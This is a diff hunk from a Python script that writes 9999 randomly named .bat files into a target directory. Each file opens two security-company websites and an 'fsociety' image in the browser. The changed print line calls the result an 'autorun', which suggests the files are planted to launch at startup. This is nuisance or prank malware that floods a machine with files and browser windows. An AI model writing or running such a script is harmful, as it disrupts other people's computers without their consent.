@@ -11,4 +11,4 @@ for i in range(9999):
     filename = f"{random_name}.bat"
     with open(os.path.join(TARGET_DIRECTORY, filename), "w") as f:
         f.write("start https://www.opsecsecurity.com/\nstart https://socradar.io\nstart https://static.ts.360.com/blog/wp-content/uploads/2016/08/160822-Post-fsociety-1.png")
-    print(f"BAT файл '{filename}' успешно создан в '{TARGET_DIRECTORY}'")
+    print(f"BAT file '{filename}' successfully created a autorun")
